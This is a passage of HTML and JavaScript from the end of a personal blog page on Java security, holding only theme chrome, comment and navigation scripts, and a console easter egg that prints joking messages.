class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/" title="java反序列化--CC5">java反序列化--CC5</a><time datetime="2024-06-07T13:21:09.000Z" title="发表于 2024-06-07 21:21:09">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4">java反序列化--CC4</a><time datetime="2024-06-07T13:21:03.000Z" title="发表于 2024-06-07 21:21:03">2024-06-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>